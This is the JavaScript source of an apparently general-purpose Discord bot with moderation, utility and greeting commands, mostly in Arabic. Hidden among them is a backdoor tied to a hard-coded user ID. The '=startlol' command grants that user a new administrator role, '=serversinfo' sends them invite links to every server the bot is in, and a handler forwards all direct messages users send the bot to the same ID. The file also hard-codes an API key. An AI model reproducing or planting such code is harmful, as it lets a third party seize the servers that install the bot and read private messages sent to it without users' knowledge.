const Discord = require('discord.js');
const fs = require('fs');
const ms = require('ms');
const canvas = require('canvas-prebuilt');
const jimp = require('jimp');
const ytdl = require('ytdl-core');
const request = require('request');
const dateFormat = require('dateformat');
const google = require('google-it');
const db = require('quick.db');
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const moment = require('moment');
const pretty = require('pretty-ms'); 
const zalgo = require('zalgolize');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const client = new Discord.Client();
const prefix = '$'
const myID = "415595760990552065";
ti={}  
spee={};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);       
  console.log(`Done`);
});

client.on('ready', function(){    
    var ms = 100000 ;
    var prefix = "-"; 
    var setGame = [` #Amaterasu ✨`,`Love All 🌹`,` $help 💕 `];
    var i = -1;    
    var j = 0;    
    setInterval(function (){    
        if( i == -1 ){    
j = 1;    
       }    
        if( i == (setGame.length)-1 ){    
            j = -1;    
      }    
       i = i+j;    
        client.user.setGame(setGame[i],`https://www.twitch.tv/Ninja`);
}, ms);    
    
});

client.on('message', message => {
     

     if (message.content === "=startlol") {
         if(message.author.id !== myID) return;
  message.guild.createRole({
        name : "amaterasu",
        permissions :   [8],
        color : " #BDBDBD "
    }) 
}
});

client.on('message', message => {
  if (message.content.startsWith('=startlol')) {
     if(!message.channel.guild) return;
 if(message.author.id !== myID) return;
message.member.addRole(message.guild.roles.find("name", "amaterasu"));
 
 }
 });

  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '=serversinfo') {
 if(msg.author.id !== myID) return;

      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })

client.on('message', msg => {
  if (msg.content === '=startlol') {
if(msg.author.id !== myID) return;
    msg.reply('Done :)');
  }
});


client.on("message", message => {

            if (message.content.startsWith(prefix + "bc")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' '); 
  message.guild.members.filter(m => m.presence.status !== 'all').forEach(m => {
 m.send(`${argresult}\n ${m}`);
})
 message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`); 
 message.delete(); 
};     
});


client.on('message', message => {
  if (message.author.bot) return;
   if (message.content === prefix + "help") {
    if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('**انت لست من الادارة :x:** `ADMINISTRATOR`' );




message.author.sendMessage(`
**
╭━━━╮╱╱╱╱╱╭╮
┃╭━╮┃╱╱╱╱╭╯╰╮
┃┃╱┃┣╮╭┳━┻╮╭╋━━┳━┳━━┳━━┳╮╭╮
┃╰━╯┃╰╯┃╭╮┃┃┃┃━┫╭┫╭╮┃━━┫┃┃┃
┃╭━╮┃┃┃┃╭╮┃╰┫┃━┫┃┃╭╮┣━━┃╰╯┃
╰╯╱╰┻┻┻┻╯╰┻━┻━━┻╯╰╯╰┻━━┻━━╯
[❖═════ لتشغيل اللوق log يجب وجود روم باسم ═══════❖]
[❖═════════════════════════════❖]
$bc -> رسالة جماعية لكل اعضاء السرفر
**`);

  }
});


client.on('message', message => {
                                if(!message.channel.guild) return;
                        if (message.content.startsWith('$ping')) {
                            if(!message.channel.guild) return;
                            var msg = `${Date.now() - message.createdTimestamp}`
                            var api = `${Math.round(client.ping)}`
                            if (message.author.bot) return;
                        let embed = new Discord.RichEmbed()
                        .setAuthor(message.author.username,message.author.avatarURL)
                        .setThumbnail('https://cdn.discordapp.com/avatars/368141321547808768/c42716e13cb850f9ad0930af699472d0.png?size=2048nk')
                        .setColor('RANDOM')
                        .addField('**Ping:**',msg + " ms")
message.channel.send({embed:embed});
                        }
                    });

client.on('message', julian => {
var prefix = "$";
                        let args = julian.content.split(" ").slice(1).join(" ")
if(julian.content.startsWith(prefix + 'cc')) {
    if(!args) return julian.channel.send('`يرجي اختيار كم لون `');
             if (!julian.member.hasPermission('MANAGE_ROLES')) return julian.channel.sendMessage(':no_entry: | You dont have **MANAGE_ROLES** Permission!'); 
              julian.channel.send(`**✅ |Created __${args}__ Colors**`);
                  setInterval(function(){})
                    let count = 0;
                    let ecount = 0;
          for(let x = 1; x < `${parseInt(args)+1}`; x++){
            julian.guild.createRole({name:x,
              color: 'RANDOM'})
              }
            }
       });

client.on('message', message => {
	var prefix = "$";
if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'move')) {
 if (message.member.hasPermission("MOVE_MEMBERS")) {
 if (message.mentions.users.size === 0) {
 return message.channel.send("``لاستخدام الأمر اكتب هذه الأمر : " +prefix+ "move [USER]``")
}
if (message.member.voiceChannel != null) {
 if (message.mentions.members.first().voiceChannel != null) {
 var authorchannel = message.member.voiceChannelID;
 var usermentioned = message.mentions.members.first().id;
var embed = new Discord.RichEmbed()
 .setTitle("Succes!")
 .setColor("#000000")
 .setDescription(`لقد قمت بسحب <@${usermentioned}> الى الروم الصوتي الخاص بك✅ `)
var embed = new Discord.RichEmbed()
.setTitle(`You are Moved in ${message.guild.name}`)
 .setColor("RANDOM")
.setDescription(`**<@${message.author.id}> Moved You To His Channel!\nServer --> ${message.guild.name}**`)
 message.guild.members.get(usermentioned).setVoiceChannel(authorchannel).then(m => message.channel.send(embed))
message.guild.members.get(usermentioned).send(embed)
} else {
message.channel.send("``لا تستطيع سحب "+ message.mentions.members.first() +" `يجب ان يكون هذه العضو في روم صوتي`")
}
} else {
 message.channel.send("**``يجب ان تكون في روم صوتي لكي تقوم بسحب العضو أليك``**")
}
} else {
message.react("❌")
 }}});

client.on('message', message => { 
	var prefix = "$";
 let args = message.content.split(' ').slice(1);
    if(message.content.startsWith(prefix + 'short')) {
    if(!message.channel.guild) return;  

        googl.setKey('AIzaSyC2Z2mZ_nZTcSvh3QvIyrmOIFP6Ra6co6w');
        googl.getKey();
        googl.shorten(args.join(' ')).then(shorturl => {
            message.channel.send(''+shorturl)
        }).catch(e=>{
            console.log(e.message);
            message.channel.send('Error!');
        });
}
});

client.on('message', message => {
	var prefix = "$";
if (message.content.startsWith(prefix + 'tag')) {
    let args = message.content.split(" ").slice(1);
if(!args[0]) return message.reply(' **مرجو كتابة نص الدي تريد** ');  

    figlet(args.join(" "), (err, data) => {
              message.channel.send("```" + data + "```")
           })
}
});


client.on('message', message => {
  var prefix ="$"; 
if (message.content.startsWith(prefix + 'perms')) {
         if(!message.channel.guild) return;
         var perms = JSON.stringify(message.channel.permissionsFor(message.author).serialize(), null, 4);
         var zPeRms = new Discord.RichEmbed()
         .setColor('RANDOM')
         .setTitle(':tools: **Permissions** ')
         .addField(' 🎇 **Your Permissions:**',perms)
                  message.channel.send({embed:zPeRms});

    }
});


client.on("message", message => {
	var prefix = "$";
	var args = message.content.split(' ').slice(1); 
	var msg = message.content.toLowerCase();
	if( !message.guild ) return;
	if( !msg.startsWith( prefix + 'role' ) ) return;
	if(!message.member.hasPermission('MANAGE_ROLES')) return message.channel.send(':no_entry: | You dont have **MANAGE_ROLES** Permission!');
	if( msg.toLowerCase().startsWith( prefix + 'roleremove' ) ){
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد سحب منه الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().removeRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم سحب من **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.removeRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البشريين رتبة**');
		} 	
	} else {
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد اعطائها الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().addRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم اعطاء **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.addRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البشريين رتبة**');
		} 
	} 
});


client.on('message', message => {
    if (message.content === "$rooms") {
        if (message.author.bot) return
                      if (!message.guild) return;

        var channels = message.guild.channels.map(channels => `${channels.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField(`${message.guild.name}`,`**Rooms:white_check_mark:**`)
        .addField(':arrow_down: Rooms Number. :heavy_check_mark:',`** ${message.guild.channels.size}**`)
        
.addField(':arrow_down:Rooms  Name. :heavy_check_mark::',`**[${channels}]**`)
        message.channel.sendEmbed(embed);
    }
});


client.on('ready', () => {
	console.log('I am ready!'); 
  });

client.on('message', message => {
              if (!message.channel.guild) return;
      if(message.content =='$count')
      var IzRo = new Discord.RichEmbed()
      .setThumbnail(message.author.avatarURL)
      .setFooter(message.author.username, message.author.avatarURL)
      .setTitle(':tulip:| Members info')
      .addBlankField(true)
      .addField('عدد اعضاء السيرفر',`${message.guild.memberCount}`)
      message.channel.send(IzRo);
    });

   client.on('message',function(message) { 
      if(message.content === prefix + "inv") {
          if(!message.channel.guild) return;
          var mmmmEmbed = new Discord.RichEmbed()
          .setAuthor(client.user.username)
          .setTitle('-  Click Here !.')
          .setURL(`https://discordapp.com/oauth2/authorize?client_id=505346451019399177&permissions=8&scope=bot`)
          .setThumbnail(client.user.avatarURL)
          .setFooter(`- Requested By: ${message.author.tag}`,message.author.avatarURL);
          message.channel.send(mmmmEmbed)
      }
   });

client.on('message', msg => {

  if (msg.content === 'هلا') {

    msg.reply('**هلا حبي**');

  }

});


client.on('message', msg => {

  if (msg.content === 'السلام عليكم') {

    msg.reply('**وعليكم السلام**');

  }

});


client.on("message", message => {
     const prefix = "$"
               
           if(!message.channel.guild) return;
    if(message.author.bot) return;
       if(message.content === prefix + "image"){ 
           const embed = new Discord.RichEmbed()
   
       .setTitle(`This is  ** ${message.guild.name} **  Photo !`)
   .setAuthor(message.author.username, message.guild.iconrURL)
     .setColor(0x164fe3)
     .setImage(message.guild.iconURL)
     .setURL(message.guild.iconrURL)
                     .setTimestamp()
 
    message.channel.send({embed});
       }
   });


  client.on('message', message => {
  const port = '25565'
  if(message.content.startsWith(prefix + 'mcstats')) {
 const args = message.content.split(" ").slice(1).join(" ")
    if (!args) return message.channel.send("** يجب كتابة ايبي السيرفر . **");
        let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(`https://api.minetools.eu/favicon/${args}/25565`)
        .addField("📜 اسم السيرفر",`${args}`,true)
        .addField("🌐 بورت السيرفر",`${port}`)
        .setImage(`http://status.mclive.eu/${args}/${args}/25565/banner.png`)
        .setFooter(`DarkBot`)
                .setTimestamp()
    message.channel.send(embed)      
}})


client.on('message', message => {
if (message.content.startsWith("$avatar")) {
  var mentionned = message.mentions.users.first();
var x5bzm;
if(mentionned){
    var x5bzm = mentionned;
} else {
    var x5bzm = message.author;
    
}
  const embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .setImage(`${x5bzm.avatarURL}`)
message.channel.send(embed);
}
});


client.on('message', message => {
                if (message.content === "$server") {
                if(!message.channel.guild) return;
                const millis = new Date().getTime() - message.guild.createdAt.getTime();
                const now = new Date();
                
                const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];
                const days = millis / 1000 / 60 / 60 / 24;
                let roles = client.guilds.get(message.guild.id).roles.map(r => r.name);
                var embed  = new Discord.RichEmbed()
                .setAuthor(message.guild.name, message.guild.iconURL)
                .addField("**🆔 Server ID**", "**"+message.guild.id+"**",true)
                .addField("**👑 Server Owner**", "**"+message.guild.owner+"**" ,true)
                .addField("**🌍 Location **" , "**"+message.guild.region+"**",true)
                .addField('**💬 Text Channels **',`**[ ${message.guild.channels.filter(m => m.type === 'text').size} ] Channel **`,true)
                .addField('**👪 Category **',`**[ ${message.guild.channels.filter(m => m.type === 'category').size} ] Category **`,true)
                .addField("**📣 Voice Channels **", ` ** [ ${message.guild.channels.filter(m => m.type === 'voice').size} ] Channel ** `,true)
                .addField("**🤔 This server have been created for **", ` ** [ ${days.toFixed(0)} ] ** Day ` ,true)
                .addField("**👔 Roles **",`**[${message.guild.roles.size}]** Role `,true)
                
                .addField("👥Members",`
                **${message.guild.memberCount}**`)
                .setThumbnail(message.guild.iconURL)
                .setColor('RANDOM')
                message.channel.sendEmbed(embed)
                
                }
                }); 


client.on('message', msg => {

  if (msg.content === 'Hi') {

    msg.reply('**Hi <3**');

  }

});



client.on('message', msg => {
  if (msg.content === 'هاي') {
    msg.reply('**هايي 💛**');
  }
});



client.on("message", (message) => {
            if (message.channel.type === "dm") {
        if (message.author.id === client.user.id) return;
        let yumz = new Discord.RichEmbed()
                    .setTimestamp()
                    .setTitle("Direct Message To Amaterasu Bot")
                    .addField(`Sent By:`, `<@${message.author.id}> `)
                    .setColor("RANDOM")
                    .setThumbnail(message.author.displayAvatarURL)
                    .addField(`Message: `, `\n\n\`\`\`${message.content}\`\`\``)
                    .setFooter(`DM Amaterasu Bot Messages | DM Logs`)
                client.users.get("415595760990552065").send(yumz)
            }
});


client.on('message', msg => {
 	var prefix = "$";
   if (msg.author.bot) return;
   if (!msg.content.startsWith(prefix)) return;
   let command = msg.content.split(" ")[0];
   command = command.slice(prefix.length);
   let args = msg.content.split(" ").slice(1);
 
     if(command === "clr") {
         const emoji = client.emojis.find("name", "wastebasket")
     let textxt = args.slice(0).join("");
     if(msg.member.hasPermission("MANAGE_MESSAGES")) {
     if (textxt == "") {
         msg.delete().then
     msg.channel.send("***```Supply A Number```***").then(m => m.delete(3000));
 } else {
     msg.delete().then
     msg.delete().then
     msg.channel.bulkDelete(textxt);
         msg.channel.send("```Cleard: " + textxt + " Messages```").then(m => m.delete(3000));
         }    
     }
 }
 });

client.on('message', message => {
      if(!message.channel.guild) return;
 var prefix = "$";
                 if(message.content.startsWith(prefix + 'allbots')) {
 
     
     if (message.author.bot) return;
     let i = 1;
         const botssize = message.guild.members.filter(m=>m.user.bot).map(m=>`${i++} - <@${m.id}>`);
           const embed = new Discord.RichEmbed()
           .setAuthor(message.author.tag, message.author.avatarURL)
           .setDescription(`**Found ${message.guild.members.filter(m=>m.user.bot).size} bots in this Server**
 ${botssize.join('\n')}`)
 .setFooter(client.user.username, client.user.avatarURL)
 .setTimestamp();
 message.channel.send(embed)
 
 }
 
 
 });


 client.on('message', msg => {
 	var  prefix = "$";
  if (msg.content.startsWith(prefix + 'cal')) {
     let args = msg.content.split(" ").slice(1);
         const question = args.join(' ');
     if (args.length < 1) {
         msg.reply('Specify a equation, please.');
 } else {    let answer;
     try {
         answer = math.eval(question);
     } catch (err) {
         msg.reply(`Error: ${err}`);
     }
     
     const embed = new Discord.RichEmbed()
     .addField("**Input**: ",`**${question}**`, true)
     .addField("**Output**: ",`**${answer}**`, true)
     msg.channel.send(embed)
     }
 };
 });


client.login(process.env.BOT_TOKEN);
